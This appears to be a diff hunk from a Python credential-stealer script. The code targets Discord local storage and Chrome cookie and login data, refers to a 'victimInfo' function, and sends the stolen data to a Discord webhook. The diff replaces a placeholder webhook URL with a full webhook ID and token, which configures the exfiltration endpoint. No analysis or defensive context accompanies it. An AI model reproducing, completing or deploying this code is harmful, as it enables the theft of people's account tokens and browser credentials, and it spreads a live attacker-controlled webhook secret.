@@ -21,8 +21,8 @@ cookiePath={'Discord': os.getenv(key=allEnv.get('appRoaming')) + '\discord\Local
             'ChormeLoginData': os.path.join(os.getenv(key=allEnv.get('appLocal')), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')}
 
 #sharing information with discord webhooks
-#webhook = Webhook.from_url("https://discord.com/api/webhooks/.........", adapter=RequestsWebhookAdapter())
-webhookURL = "https://discord.com/api/webhooks/..............." #CHANGE ME
+#webhook = Webhook.from_url("https://discord.com/api/webhooks/1133120500281917520/xEjweW195zBCPQwWOFznIPKufbA1p4TRf2dUvdhZ8TyA4VZBh6qHc05f9IX_w7cN180S", adapter=RequestsWebhookAdapter())
+webhookURL = "https://discord.com/api/webhooks/1133120500281917520/xEjweW195zBCPQwWOFznIPKufbA1p4TRf2dUvdhZ8TyA4VZBh6qHc05f9IX_w7cN180S" #CHANGE ME
 
 try:
     def victimInfo():
